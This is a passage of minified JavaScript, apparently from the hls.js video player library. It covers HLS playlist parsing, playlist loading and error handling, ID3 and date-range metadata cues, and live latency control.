d=0<i.length&&i.length<n.levels.length;return n.levels=d?i:n.levels,0===n.levels.length&&(n.playlistParsingError=new Error("no levels found in manifest")),n}static parseMasterPlaylistMedia(t,e,r){var n={},i=r.levels,a={AUDIO:i.map((t=>({id:t.attrs.AUDIO,audioCodec:t.audioCodec}))),SUBTITLES:i.map((t=>({id:t.attrs.SUBTITLES,textCodec:t.textCodec}))),"CLOSED-CAPTIONS":[]};let s=0;for(ue.lastIndex=0;null!==(u=ue.exec(t));){var o,l,u=new B(u[1]),h=u.TYPE;h&&(o=a[h],l=n[h]||[],n[h]=l,U(r,u,["URI","GROUP-ID","LANGUAGE","ASSOC-LANGUAGE","STABLE-RENDITION-ID","NAME","INSTREAM-ID","CHARACTERISTICS","CHANNELS"]),h={attrs:u,bitrate:0,id:s++,groupId:u["GROUP-ID"]||"",instreamId:u["INSTREAM-ID"],name:u.NAME||u.LANGUAGE||"",type:h,default:u.bool("DEFAULT"),autoselect:u.bool("AUTOSELECT"),forced:u.bool("FORCED"),lang:u.LANGUAGE,url:u.URI?m.resolve(u.URI,e):""},null!=o&&o.length&&(ge(h,u=m.findGroup(o,h.groupId)||o[0],"audioCodec"),ge(h,u,"textCodec")),l.push(h))}return n}static parseLevelPlaylist(t,e,r,n,i,F){var a=new dt(e),s=a.fragments;let p,g,v,o=null,l=0,u=0,h=0,c=0,d=null,f=new ht(n,e),m=-1,y=!1;for(ce.lastIndex=0,a.m3u8=t,a.hasVariableRefs=ee(t);null!==(p=ce.exec(t));){y&&(y=!1,(f=new ht(n,e)).start=h,f.sn=l,f.cc=c,f.level=r,o)&&(f.initSegment=o,f.rawProgramDateTime=o.rawProgramDateTime,o.rawProgramDateTime=null);var E=p[1];if(E){f.duration=parseFloat(E);var T=(" "+p[2]).slice(1);f.title=T||null,f.tagList.push(T?["INF",E,T]:["INF",E])}else if(p[3])N(f.duration)&&(f.start=h,v&&ye(f,v,a),f.sn=l,f.level=r,f.cc=c,f.urlId=i,s.push(f),T=(" "+p[3]).slice(1),f.relurl=re(a,T),ve(f,d),d=f,h+=f.duration,l++,u=0,y=!0);else if(p[4])E=(" "+p[4]).slice(1),d?f.setByteRange(E,d):f.setByteRange(E);else if(p[5])f.rawProgramDateTime=(" "+p[5]).slice(1),f.tagList.push(["PROGRAM-DATE-TIME",f.rawProgramDateTime]),-1===m&&(m=s.length);else if(p=p[0].match(de)){for(g=1;g<p.length&&void 0===p[g];g++);var b=(" "+p[g]).slice(1),A=(" "+p[g+1]).slice(1),_=p[g+2]?(" "+p[g+2]).slice(1):"";switch(b){case"PLAYLIST-TYPE":a.type=A.toUpperCase();break;case"MEDIA-SEQUENCE":l=a.startSN=parseInt(A);break;case"SKIP":var S=new B(A),L=(U(a,S,["RECENTLY-REMOVED-DATERANGES"]),S.decimalInteger("SKIPPED-SEGMENTS"));if(N(L)){for(let t=a.skippedSegments=L;t--;)s.unshift(null);l+=L}(L=S.enumeratedString("RECENTLY-REMOVED-DATERANGES"))&&(a.recentlyRemovedDateranges=L.split("\t"));break;case"TARGETDURATION":a.targetduration=Math.max(parseInt(A),1);break;case"VERSION":a.version=parseInt(A);break;case"EXTM3U":break;case"ENDLIST":a.live=!1;break;case"#":(A||_)&&f.tagList.push(_?[A,_]:[A]);break;case"DISCONTINUITY":c++,f.tagList.push(["DIS"]);break;case"GAP":f.gap=!0,f.tagList.push([b]);break;case"BITRATE":f.tagList.push([b,A]);break;case"DATERANGE":U(a,S=new B(A),["ID","CLASS","START-DATE","END-DATE","SCTE35-CMD","SCTE35-OUT","SCTE35-IN"]),U(a,S,S.clientAttrs),(L=new st(S,a.dateRanges[S.ID])).isValid||a.skippedSegments?a.dateRanges[L.id]=L:V.warn(`Ignoring invalid DATERANGE tag: "${A}"`),f.tagList.push(["EXT-X-DATERANGE",A]);break;case"DEFINE":var k=new B(A);if(U(a,k,["NAME","VALUE","IMPORT","QUERYPARAM"]),"IMPORT"in k){I=w=R=void 0;var R=a,w=k,I=F;if(w=w.IMPORT,I&&w in I){let t=R.variableList;t||(R.variableList=t={}),t[w]=I[w]}else R.playlistParsingError||(R.playlistParsingError=new Error(`EXT-X-DEFINE IMPORT attribute not found in Multivariant Playlist: "${w}"`))}else ne(a,k,e);break;case"DISCONTINUITY-SEQUENCE":c=parseInt(A);break;case"KEY":if((I=fe(A,e,a)).isSupported()){if("NONE"===I.method){v=void 0;break}(v=(v=v||{})[I.keyFormat]?G({},v):v)[I.keyFormat]=I}else V.warn(`[Keys] Ignoring invalid EXT-X-KEY tag: "${A}"`);break;case"START":a.startTimeOffset=pe(A);break;case"MAP":U(a,R=new B(A),["BYTERANGE","URI"]),f.duration?(me(w=new ht(n,e),R,r,v),o=w,(f.initSegment=o).rawProgramDateTime&&!f.rawProgramDateTime&&(f.rawProgramDateTime=o.rawProgramDateTime)):(me(f,R,r,v),o=f,y=!0);break;case"SERVER-CONTROL":k=new B(A),a.canBlockReload=k.bool("CAN-BLOCK-RELOAD"),a.canSkipUntil=k.optionalFloat("CAN-SKIP-UNTIL",0),a.canSkipDateRanges=0<a.canSkipUntil&&k.bool("CAN-SKIP-DATERANGES"),a.partHoldBack=k.optionalFloat("PART-HOLD-BACK",0),a.holdBack=k.optionalFloat("HOLD-BACK",0);break;case"PART-INF":var D=new B(A);a.partTarget=D.decimalFloatingPoint("PART-TARGET");break;case"PART":{let t=a.partList;t=t||(a.partList=[]);D=0<u?t[t.length-1]:void 0;var C=u++,P=(U(a,P=new B(A),["BYTERANGE","URI"]),new ct(P,f,e,C,D));t.push(P),f.duration+=P.duration;break}case"PRELOAD-HINT":U(a,C=new B(A),["URI"]),a.preloadHint=C;break;case"RENDITION-REPORT":U(a,P=new B(A),["URI"]),a.renditionReports=a.renditionReports||[],a.renditionReports.push(P);break;default:V.warn("line parsed but not handled: "+p)}}else V.warn("No matches on slow regex match for level playlist!")}d&&!d.relurl?(s.pop(),h-=d.duration,a.partList&&(a.fragmentHint=d)):a.partList&&(ve(f,d),f.cc=c,a.fragmentHint=f,v)&&ye(f,v,a);var x=s.length,O=s[0],M=s[x-1];return 0<(h+=a.skippedSegments*a.targetduration)&&x&&M?(a.averagetargetduration=h/x,x=M.sn,a.endSN="initSegment"!==x?x:0,a.live||(M.endList=!0),O&&(a.startCC=O.cc)):(a.endSN=0,a.startCC=0),a.fragmentHint&&(h+=a.fragmentHint.duration),a.totalduration=h,a.endCC=c,0<m&&function(e,r){let n=e[r];for(let t=r;t--;){var i=e[t];if(!i)return;i.programDateTime=n.programDateTime-1e3*i.duration,n=i}}(s,m),a}}function fe(t,e,r){U(r,t=new B(t),["KEYFORMAT","KEYFORMATVERSIONS","URI","IV","URI"]),r=null!=(r=t.METHOD)?r:"";var n=t.URI,i=t.hexadecimalInteger("IV"),a=t.KEYFORMATVERSIONS,s=null!=(s=t.KEYFORMAT)?s:"identity";n&&t.IV&&!i&&V.error("Invalid IV: "+t.IV),t=n?m.resolve(n,e):"",n=(a||"1").split("/").map(Number).filter(Number.isFinite);return new Zt(r,t,s,n,i)}function pe(t){return t=new B(t).decimalFloatingPoint("TIME-OFFSET"),N(t)?t:null}function ge(t,e,r){(e=e[r])&&(t[r]=e)}function ve(t,e){t.rawProgramDateTime?t.programDateTime=Date.parse(t.rawProgramDateTime):null!=e&&e.programDateTime&&(t.programDateTime=e.endProgramDateTime),N(t.programDateTime)||(t.programDateTime=null,t.rawProgramDateTime=null)}function me(t,e,r,n){t.relurl=e.URI,e.BYTERANGE&&t.setByteRange(e.BYTERANGE),t.level=r,t.sn="initSegment",n&&(t.levelkeys=n),t.initSegment=null}function ye(t,e,r){t.levelkeys=e,(r=r.encryptedFragments).length&&r[r.length-1].levelkeys===e||!Object.keys(e).some((t=>e[t].isCommonEncryption))||r.push(t)}var Ee="manifest",Te="level",E="audioTrack",b="subtitleTrack",A="main",_="audio",be="subtitle";function Ae(t){switch(t=t.type){case E:return _;case b:return be;default:return A}}function _e(t,e){let r=t.url;return void 0!==r&&0!==r.indexOf("data:")?r:e.url}class Se{constructor(t){this.hls=void 0,this.loaders=Object.create(null),this.variableList=null,this.hls=t,this.registerListeners()}startLoad(t){}stopLoad(){this.destroyInternalLoaders()}registerListeners(){var t=this.hls;t.on($.MANIFEST_LOADING,this.onManifestLoading,this),t.on($.LEVEL_LOADING,this.onLevelLoading,this),t.on($.AUDIO_TRACK_LOADING,this.onAudioTrackLoading,this),t.on($.SUBTITLE_TRACK_LOADING,this.onSubtitleTrackLoading,this)}unregisterListeners(){var t=this.hls;t.off($.MANIFEST_LOADING,this.onManifestLoading,this),t.off($.LEVEL_LOADING,this.onLevelLoading,this),t.off($.AUDIO_TRACK_LOADING,this.onAudioTrackLoading,this),t.off($.SUBTITLE_TRACK_LOADING,this.onSubtitleTrackLoading,this)}createInternalLoader(t){var e=this.hls.config,r=e.pLoader,n=e.loader;r=new(r||n)(e);return this.loaders[t.type]=r}getInternalLoader(t){return this.loaders[t.type]}resetInternalLoader(t){this.loaders[t]&&delete this.loaders[t]}destroyInternalLoaders(){for(const e in this.loaders){var t=this.loaders[e];t&&t.destroy(),this.resetInternalLoader(e)}}destroy(){this.variableList=null,this.unregisterListeners(),this.destroyInternalLoaders()}onManifestLoading(t,e){e=e.url,this.variableList=null,this.load({id:null,level:0,responseType:"text",type:Ee,url:e,deliveryDirectives:null})}onLevelLoading(t,e){var{id:e,level:r,url:n,deliveryDirectives:i}=e;this.load({id:e,level:r,responseType:"text",type:Te,url:n,deliveryDirectives:i})}onAudioTrackLoading(t,e){var{id:e,groupId:r,url:n,deliveryDirectives:i}=e;this.load({id:e,groupId:r,level:null,responseType:"text",type:E,url:n,deliveryDirectives:i})}onSubtitleTrackLoading(t,e){var{id:e,groupId:r,url:n,deliveryDirectives:i}=e;this.load({id:e,groupId:r,level:null,responseType:"text",type:b,url:n,deliveryDirectives:i})}load(e){var r=this.hls.config;let i,t=this.getInternalLoader(e);if(t){var n=t.context;if(n&&n.url===e.url)return void V.trace("[playlist-loader]: playlist request ongoing");V.log("[playlist-loader]: aborting previous loader for type: "+e.type),t.abort()}if(i=e.type===Ee?r.manifestLoadPolicy.default:G({},r.playlistLoadPolicy.default,{timeoutRetry:null,errorRetry:null}),t=this.createInternalLoader(e),null!=(n=e.deliveryDirectives)&&n.part){let t;e.type===Te&&null!==e.level?t=this.hls.levels[e.level].details:e.type===E&&null!==e.id?t=this.hls.audioTracks[e.id].details:e.type===b&&null!==e.id&&(t=this.hls.subtitleTracks[e.id].details),t&&(r=t.partTarget,n=t.targetduration,r)&&n&&(r=1e3*Math.max(3*r,.8*n),i=G({},i,{maxTimeToFirstByteMs:Math.min(r,i.maxTimeToFirstByteMs),maxLoadTimeMs:Math.min(r,i.maxTimeToFirstByteMs)}))}n=i.errorRetry||i.timeoutRetry||{},r={loadPolicy:i,timeout:i.maxLoadTimeMs,maxRetry:n.maxNumRetry||0,retryDelay:n.retryDelayMs||0,maxRetryDelay:n.maxRetryDelayMs||0},t.load(e,r,{onSuccess:(t,e,r,n)=>{var i=this.getInternalLoader(r),a=(this.resetInternalLoader(r.type),t.data);0!==a.indexOf("#EXTM3U")?this.handleManifestParsingError(t,r,new Error("no EXTM3U delimiter"),n||null,e):(e.parsing.start=performance.now(),m.isMediaPlaylist(a)?this.handleTrackOrLevelPlaylist(t,e,r,n||null,i):this.handleMasterPlaylist(t,e,r,n))},onError:(t,e,r,n)=>{this.handleNetworkError(e,r,!1,t,n)},onTimeout:(t,e,r)=>{this.handleNetworkError(e,r,!0,void 0,t)}})}handleMasterPlaylist(t,e,r,n){var i,a,s,o,l,u=this.hls,h=t.data,c=_e(t,r),d=m.parseMasterPlaylist(h,c);d.playlistParsingError?this.handleManifestParsingError(t,r,d.playlistParsingError,n,e):(({contentSteering:t,levels:r,sessionData:i,sessionKeys:a,startTimeOffset:s,variableList:o}=d),({AUDIO:h=[],SUBTITLES:d,"CLOSED-CAPTIONS":l}=(this.variableList=o,m.parseMasterPlaylistMedia(h,c,d))),h.length&&!h.some((t=>!t.url))&&r[0].audioCodec&&!r[0].attrs.AUDIO&&(V.log("[playlist-loader]: audio codec signaled in quality level, but no embedded audio track signaled, create one"),h.unshift({type:"main",name:"main",groupId:"main",default:!1,autoselect:!1,forced:!1,id:-1,attrs:new B({}),bitrate:0,url:""})),u.trigger($.MANIFEST_LOADED,{levels:r,audioTracks:h,subtitles:d,captions:l,contentSteering:t,url:c,stats:e,networkDetails:n,sessionData:i,sessionKeys:a,startTimeOffset:s,variableList:o}))}handleTrackOrLevelPlaylist(t,e,r,n,i){var a=this.hls,{id:s,level:o,type:l}=r,u=_e(t,r),s=N(s)?s:0,h=(o=N(o)?o:s,Ae(r)),o=m.parseLevelPlaylist(t.data,u,o,h,s,this.variableList);l===Ee&&(h={attrs:new B({}),bitrate:0,details:o,name:"",url:u},a.trigger($.MANIFEST_LOADED,{levels:[h],audioTracks:[],url:u,stats:e,networkDetails:n,sessionData:null,sessionKeys:null,contentSteering:null,startTimeOffset:null,variableList:null})),e.parsing.end=performance.now(),r.levelDetails=o,this.handlePlaylistLoaded(o,t,e,r,n,i)}handleManifestParsingError(t,e,r,n,i){this.hls.trigger($.ERROR,{type:K.NETWORK_ERROR,details:H.MANIFEST_PARSING_ERROR,fatal:e.type===Ee,url:t.url,err:r,error:r,reason:r.message,response:t,context:e,networkDetails:n,stats:i})}handleNetworkError(t,e,r=!1,n,i){let a=`A network ${r?"timeout":"error"+(n?" (status "+n.code+")":"")} occurred while loading `+t.type;t.type===Te?a+=`: ${t.level} id: `+t.id:t.type!==E&&t.type!==b||(a+=` id: ${t.id} group-id: "${t.groupId}"`);var s=new Error(a);V.warn("[playlist-loader]: "+a);let o=H.UNKNOWN,l=!1;var u=this.getInternalLoader(t);switch(t.type){case Ee:o=r?H.MANIFEST_LOAD_TIMEOUT:H.MANIFEST_LOAD_ERROR,l=!0;break;case Te:o=r?H.LEVEL_LOAD_TIMEOUT:H.LEVEL_LOAD_ERROR,l=!1;break;case E:o=r?H.AUDIO_TRACK_LOAD_TIMEOUT:H.AUDIO_TRACK_LOAD_ERROR,l=!1;break;case b:o=r?H.SUBTITLE_TRACK_LOAD_TIMEOUT:H.SUBTITLE_LOAD_ERROR,l=!1}u&&this.resetInternalLoader(t.type),u={type:K.NETWORK_ERROR,details:o,fatal:l,url:t.url,loader:u,context:t,error:s,networkDetails:e,stats:i},n&&(s=(null==e?void 0:e.url)||t.url,u.response=f({url:s,data:void 0},n)),this.hls.trigger($.ERROR,u)}handlePlaylistLoaded(t,e,r,n,i,a){var l,s=this.hls,{type:o,level:l,id:u,groupId:h,deliveryDirectives:c}=n,d=_e(e,n),f=Ae(n),p="number"==typeof n.level&&f===A?l:void 0;if(t.fragments.length)if(t.targetduration||(t.playlistParsingError=new Error("Missing Target Duration")),l=t.playlistParsingError)s.trigger($.ERROR,{type:K.NETWORK_ERROR,details:H.LEVEL_PARSING_ERROR,fatal:!1,url:d,error:l,reason:l.message,response:e,context:n,level:p,parent:f,networkDetails:i,stats:r});else switch(t.live&&a&&(a.getCacheAge&&(t.ageHeader=a.getCacheAge()||0),a.getCacheAge&&!isNaN(t.ageHeader)||(t.ageHeader=0)),o){case Ee:case Te:s.trigger($.LEVEL_LOADED,{details:t,level:p||0,id:u||0,stats:r,networkDetails:i,deliveryDirectives:c});break;case E:s.trigger($.AUDIO_TRACK_LOADED,{details:t,id:u||0,groupId:h||"",stats:r,networkDetails:i,deliveryDirectives:c});break;case b:s.trigger($.SUBTITLE_TRACK_LOADED,{details:t,id:u||0,groupId:h||"",stats:r,networkDetails:i,deliveryDirectives:c})}else l=new Error("No Segments found in Playlist"),s.trigger($.ERROR,{type:K.NETWORK_ERROR,details:H.LEVEL_EMPTY_ERROR,fatal:!1,url:d,error:l,reason:l.message,response:e,context:n,level:p,parent:f,networkDetails:i,stats:r})}}function Le(t,e){let r;try{r=new Event("addtrack")}catch(t){(r=document.createEvent("Event")).initEvent("addtrack",!1,!1)}r.track=t,e.dispatchEvent(r)}function ke(e,r){var t=e.mode;if("disabled"===t&&(e.mode="hidden"),e.cues&&!e.cues.getCueById(r.id))try{if(e.addCue(r),!e.cues.getCueById(r.id))throw new Error("addCue is failed for: "+r)}catch(t){V.debug("[texttrack-utils]: "+t);try{var n=new self.TextTrackCue(r.startTime,r.endTime,r.text);n.id=r.id,e.addCue(n)}catch(t){V.debug("[texttrack-utils]: Legacy TextTrackCue fallback failed: "+t)}}"disabled"===t&&(e.mode=t)}function Re(e){var t=e.mode;if("disabled"===t&&(e.mode="hidden"),e.cues)for(let t=e.cues.length;t--;)e.removeCue(e.cues[t]);"disabled"===t&&(e.mode=t)}function we(e,t,r,n){var i=e.mode;if("disabled"===i&&(e.mode="hidden"),e.cues&&0<e.cues.length){var a=function(r,n,i){var a=[],s=function(t,e){if(e<t[0].startTime)return 0;var r=t.length-1;if(e>t[r].endTime)return-1;let n=0,i=r;for(;n<=i;){var a=Math.floor((i+n)/2);if(e<t[a].startTime)i=a-1;else{if(!(e>t[a].startTime&&n<r))return a;n=a+1}}return t[n].startTime-e<e-t[i].startTime?n:i}(r,n);if(-1<s)for(let t=s,e=r.length;t<e;t++){var o=r[t];if(o.startTime>=n&&o.endTime<=i)a.push(o);else if(o.startTime>i)return a}return a}(e.cues,t,r);for(let t=0;t<a.length;t++)n&&!n(a[t])||e.removeCue(a[t])}"disabled"===i&&(e.mode=i)}var Ie="org.id3",Ce="https://aomedia.org/emsg/ID3";function Pe(){if("undefined"!=typeof self)return self.VTTCue||self.TextTrackCue}function xe(e,r,n,i,a){let s=new e(r,n,"");try{s.value=i,a&&(s.type=a)}catch(t){s=new e(r,n,JSON.stringify(a?f({type:a},i):i))}return s}const Oe=(()=>{var t=Pe();try{t&&new t(0,Number.POSITIVE_INFINITY,"")}catch(t){return Number.MAX_VALUE}return Number.POSITIVE_INFINITY})();function Me(t,e){return t.getTime()/1e3-e}class Fe{constructor(t){this.hls=void 0,this.id3Track=null,this.media=null,this.dateRangeCuesAppended={},this.hls=t,this._registerListeners()}destroy(){this._unregisterListeners(),this.id3Track=null,this.media=null,this.dateRangeCuesAppended={},this.hls=null}_registerListeners(){var t=this.hls;t.on($.MEDIA_ATTACHED,this.onMediaAttached,this),t.on($.MEDIA_DETACHING,this.onMediaDetaching,this),t.on($.MANIFEST_LOADING,this.onManifestLoading,this),t.on($.FRAG_PARSING_METADATA,this.onFragParsingMetadata,this),t.on($.BUFFER_FLUSHING,this.onBufferFlushing,this),t.on($.LEVEL_UPDATED,this.onLevelUpdated,this)}_unregisterListeners(){var t=this.hls;t.off($.MEDIA_ATTACHED,this.onMediaAttached,this),t.off($.MEDIA_DETACHING,this.onMediaDetaching,this),t.off($.MANIFEST_LOADING,this.onManifestLoading,this),t.off($.FRAG_PARSING_METADATA,this.onFragParsingMetadata,this),t.off($.BUFFER_FLUSHING,this.onBufferFlushing,this),t.off($.LEVEL_UPDATED,this.onLevelUpdated,this)}onMediaAttached(t,e){this.media=e.media}onMediaDetaching(){this.id3Track&&(Re(this.id3Track),this.id3Track=null,this.media=null,this.dateRangeCuesAppended={})}onManifestLoading(){this.dateRangeCuesAppended={}}createTrack(t){return(t=this.getID3Track(t.textTracks)).mode="hidden",t}getID3Track(e){if(this.media){for(let t=0;t<e.length;t++){var r=e[t];if("metadata"===r.kind&&"id3"===r.label)return Le(r,this.media),r}return this.media.addTextTrack("metadata","id3")}}onFragParsingMetadata(t,e){if(this.media){var{enableEmsgMetadataCues:r,enableID3MetadataCues:n}=this.hls.config;if(r||n){var i=e.samples,a=(this.id3Track||(this.id3Track=this.createTrack(this.media)),Pe());if(a)for(let t=0;t<i.length;t++){var s=i[t].type;if((s!==Ce||r)&&n){var o=xt(i[t].data);if(o){var l=i[t].pts;let e=l+i[t].duration;(e=e>Oe?Oe:e)-l<=0&&(e=l+.25);for(let t=0;t<o.length;t++){var u=o[t];!Pt(u)&&(this.updateId3CueEnds(l,s),u=xe(a,l,e,u,s))&&this.id3Track.addCue(u)}}}}}}}updateId3CueEnds(e,r){var t,n=null==(t=this.id3Track)?void 0:t.cues;if(n)for(let t=n.length;t--;){var i=n[t];i.type===r&&i.startTime<e&&i.endTime===Oe&&(i.endTime=e)}}onBufferFlushing(t,{startOffset:e,endOffset:r,type:n}){var{id3Track:i,hls:a}=this;if(a){const{enableEmsgMetadataCues:s,enableID3MetadataCues:o}=a.config;if(i&&(s||o)){let t;we(i,e,r,t="audio"===n?t=>t.type===Ie&&o:"video"===n?t=>t.type===Ce&&s:t=>t.type===Ie&&o||t.type===Ce&&s)}}}onLevelUpdated(t,{details:e}){if(this.media&&e.hasProgramDateTime&&this.hls.config.enableDateRangeMetadataCues){const{dateRangeCuesAppended:f,id3Track:p}=this,g=e.dateRanges,v=Object.keys(g);if(p){var r=Object.keys(f).filter((t=>!v.includes(t)));for(let t=r.length;t--;){const m=r[t];Object.keys(f[m].cues).forEach((t=>{p.removeCue(f[m].cues[t])})),delete f[m]}}if(e=e.fragments[e.fragments.length-1],0!==v.length&&N(null==e?void 0:e.programDateTime)){this.id3Track||(this.id3Track=this.createTrack(this.media));var n=e.programDateTime/1e3-e.start,i=Pe();for(let t=0;t<v.length;t++){var a=v[t];const y=g[a];var s=f[a],o=(null==s?void 0:s.cues)||{};let e=(null==s?void 0:s.durationKnown)||!1;var l=Me(y.startDate,n);let r=Oe;var u=y.endDate,h=(u?(r=Me(u,n),e=!0):y.endOnNext&&!e&&(u=v.reduce(((t,e)=>{var r=g[e];return r.class===y.class&&r.id!==e&&r.startDate>y.startDate&&t.push(r),t}),[]).sort(((t,e)=>t.startDate.getTime()-e.startDate.getTime()))[0])&&(r=Me(u.startDate,n),e=!0),Object.keys(y.attr));for(let t=0;t<h.length;t++){var c=h[t];if("ID"!==(d=c)&&"CLASS"!==d&&"START-DATE"!==d&&"DURATION"!==d&&"END-DATE"!==d&&"END-ON-NEXT"!==d){var d=o[c];if(d)e&&!s.durationKnown&&(d.endTime=r);else if(i){let t=y.attr[c];"SCTE35-OUT"!==(d=c)&&"SCTE35-IN"!==d||(d=t,t=Uint8Array.from(d.replace(/^0x/,"").replace(/([\da-fA-F]{2}) ?/g,"0x$1 ").replace(/ +$/,"").split(" ")).buffer),(d=xe(i,l,r,{key:c,data:t},"com.apple.quicktime.HLS"))&&(d.id=a,this.id3Track.addCue(d),o[c]=d)}}}f[a]={cues:o,dateRange:y,durationKnown:e}}}}}}class Ne{constructor(t){this.hls=void 0,this.config=void 0,this.media=null,this.levelDetails=null,this.currentTime=0,this.stallCount=0,this._latency=null,this.timeupdateHandler=()=>this.timeupdate(),this.hls=t,this.config=t.config,this.registerListeners()}get latency(){return this._latency||0}get maxLatency(){var{config:t,levelDetails:e}=this;return void 0!==t.liveMaxLatencyDuration?t.liveMaxLatencyDuration:e?t.liveMaxLatencyDurationCount*e.targetduration:0}get targetLatency(){var t;if(null===(t=this.levelDetails))return null;var{holdBack:t,partHoldBack:e,targetduration:r}=t,{liveSyncDuration:n,liveSyncDurationCount:i,lowLatencyMode:a}=this.config,s=this.hls.userConfig;let o=a&&e||t;return(o=s.liveSyncDuration||s.liveSyncDurationCount||0===o?void 0!==n?n:i*r:o)+Math.min(+this.stallCount,r)}get liveSyncPosition(){var t,e=this.estimateLiveEdge(),r=this.targetLatency,n=this.levelDetails;return null===e||null===r||null===n?null:(t=n.edge,e=e-r-this.edgeStalled,r=t-n.totalduration,t-=this.config.lowLatencyMode&&n.partTarget||n.targetduration,Math.min(Math.max(r,e),t))}get drift(){var t=this.levelDetails;return null===t?1:t.drift}get edgeStalled(){var t,e=this.levelDetails;return null===e?0:(t=3*(this.config.lowLatencyMode&&e.partTarget||e.targetduration),Math.max(e.age-t,0))}get forwardBufferLength(){var t,{media:e,levelDetails:r}=this;return e&&r?((t=e.buffered.length)?e.buffered.end(t-1):r.edge)-this.currentTime:0}destroy(){this.unregisterListeners(),this.onMediaDetaching(),this.levelDetails=null,this.hls=this.timeupdateHandler=null}registerListeners(){this.hls.on($.MEDIA_ATTACHED,this.onMediaAttached,this),this.hls.on($.MEDIA_DETACHING,this.onMediaDetaching,this),this.hls.on($.MANIFEST_LOADING,this.onManifestLoading,this),this.hls.on($.LEVEL_UPDATED,this.onLevelUpdated,this),this.hls.on($.ERROR,this.onError,this)}unregisterListeners(){this.hls.off($.MEDIA_ATTACHED,this.onMediaAttached,this),this.hls.off($.MEDIA_DETACHING,this.onMediaDetaching,this),this.hls.off($.MANIFEST_LOADING,this.onManifestLoading,this),this.hls.off($.LEVEL_UPDATED,this.onLevelUpdated,this),this.hls.off($.ERROR,this.onError,this)}onMediaAttached(t,e){this.media=e.media,this.media.addEventListener("timeupdate",this.timeupdateHandler)}onMediaDetaching(){this.media&&(this.media.removeEventListener("timeupdate",this.timeupdateHandler),this.media=null)}onManifestLoading(){this.levelDetails=null,this._latency=null,this.stallCount=0}onLevelUpdated(t,{details:e}){(this.levelDetails=e).advanced&&this.timeupdate(),!e.live&&this.media&&this.media.removeEventListener("timeupdate",this.timeupdateHandler)}onError(t,e){e.details===H.BUFFER_STALLED_ERROR&&(this.stallCount++,null!=(e=this.levelDetails))&&e.live&&V.warn("[playback-rate-controller]: Stall detected, adjusting target latency")}timeupdate(){var t,e,r,{media:n,levelDetails:i}=this;n&&i&&(this.currentTime=n.currentTime,null!==(e=this.computeLatency()))&&(this._latency=e,({lowLatencyMode:r,maxLiveSyncPlaybackRate:t}=this.config),r)&&1!==t&&null!==(r=this.targetLatency)&&(e-=r,r=Math.min(this.maxLatency,r+i.targetduration),i.live&&e<r&&.05<e&&1<this.forwardBufferLength?(i=Math.min(2,Math.max(1,t)),r=Math.round(2/(1+Math.exp(-.75*e-this.edgeStalled))*20)/20,n.playbackRate=Math.min(i,Math.max(1,r))):1!==n.playbackRate&&0!==n.playbackRate&&(n.playbackRate=1))}estimateLiveEdge(){var t=this.levelDetails;return null===t?null:t.edge+t.age}computeLatency(){var t=this.estimateLiveEdge();return null===t?null:t-this.currentTime}}const Be=["NONE","TYPE-0","TYPE-1",null];class $e{constructor(t,e,r){this.msn=void 0,this.part=void 0,this.skip=void 0,this.msn=t,this.part=e,this.skip=r}addDirectives(t){return t=new self.URL(t),void 0!==this.msn&&t.searchParams.set("_HLS_msn",this.msn.toString()),void 0!==this.part&&t.searchParams.set("_HLS_part",this.part.toString()),this.skip&&t.searchParams.set("_HLS_skip",this.skip),t.href}}class Ke{constructor(t){this._attrs=void 0,this.audioCodec=void 0,this.bitrate=void 0,this.codecSet=void 0,this.height=void 0,this.id=void 0,this.name=void 0,this.videoCodec=void 0,this.width=void 0,this.unknownCodecs=void 0,this.audioGroupIds=void 0,this.details=void 0,this.fragmentError=0,this.loadError=0,this.loaded=void 0,this.realBitrate=0,this.textGroupIds=void 0,this.url=void 0,this._urlId=0,this.url=[t.url],this._attrs=[t.attrs],this.bitrate=t.bitrate,t.details&&(this.details=t.details),this.id=t.id||0,this.name=t.name,this.width=t.width||0,this.height=t.height||0,this.audioCodec=t.audioCodec,this.videoCodec=t.videoCodec,this.unknownCodecs=t.unknownCodecs,this.codecSet=[t.videoCodec,t.audioCodec].filter((t=>t)).join(",").replace(/\.[^.,]+/g,"")}get maxBitrate(){return Math.max(this.realBitrate,this.bitrate)}get attrs(){return this._attrs[this._urlId]}get pathwayId(){return this.attrs["PATHWAY-ID"]||"."}get uri(){return this.url[this._urlId]||""}get urlId(){return this._urlId}set urlId(t){t%=this.url.length,this._urlId!==t&&(this.fragmentError=0,this.loadError=0,this.details=void 0,this._urlId=t)}get audioGroupId(){var t;return null==(t=this.audioGroupIds)?void 0:t[this.urlId]}get textGroupId(){var t;return null==(t=this.textGroupIds)?void 0:t[this.urlId]}addFallback(t){this.url.push(t.url),this._attrs.push(t.attrs)}}function He(r,n){var i=n.startPTS;if(N(i)){let e,t=0;(e=n.sn>r.sn?(t=i-r.start,r):(t=r.start-i,n)).duration!==t&&(e.duration=t)}else n.sn>r.sn?r.cc===n.cc&&r.minEndPTS?n.start=r.start+(r.minEndPTS-r.start):n.start=r.start+r.duration:n.start=Math.max(r.start-n.duration,0)}function Ve(t,e,r,n,i,a){n-r<=0&&(V.warn("Fragment should have a positive duration",e),n=r+e.duration,a=i+e.duration);let s=r,o=n;var l=e.startPTS,u=e.endPTS,h=(N(l)&&(h=Math.abs(l-r),N(e.deltaPTS)?e.deltaPTS=Math.max(h,e.deltaPTS):e.deltaPTS=h,s=Math.max(r,l),r=Math.min(r,l),i=Math.min(i,e.startDTS),o=Math.min(n,u),n=Math.max(n,u),a=Math.max(a,e.endDTS)),r-e.start);0!==e.start&&(e.start=r),e.duration=n-e.start,e.startPTS=r,e.maxStartPTS=s,e.startDTS=i,e.endPTS=n,e.minEndPTS=o,e.endDTS=a,l=e.sn;if(!t||l<t.startSN||l>t.endSN)return 0;let c;u=l-t.startSN;var d=t.fragments;for(d[u]=e,c=u;0<c;c--)He(d[c],d[c-1]);for(c=u;c<d.length-1;c++)He(d[c],d[c+1]);return t.fragmentHint&&He(d[d.length-1],t.fragmentHint),t.PTSKnown=t.alignedSliding=!0,h}function Ye(t,e){var r=e.startSN+e.skippedSegments-t.startSN;t=t.fragments;r<0||r>=t.length||qe(e,t[r].start)}function qe(e,r){if(r){var n=e.fragments;for(let t=e.skippedSegments;t<n.length;t++)n[t].start+=r;e.fragmentHint&&(e.fragmentHint.start+=r)}}function ze(t,e,r){return null!=t&&t.details?Qe(null==(t=t.details)?void 0:t.partList,e,r):null}function Qe(e,r,n){if(e)for(let t=e.length;t--;){var i=e[t];if(i.index===n&&i.fragment.sn===r)return i}return null}function Xe(t){switch(t.details){case H.FRAG_LOAD_TIMEOUT:case 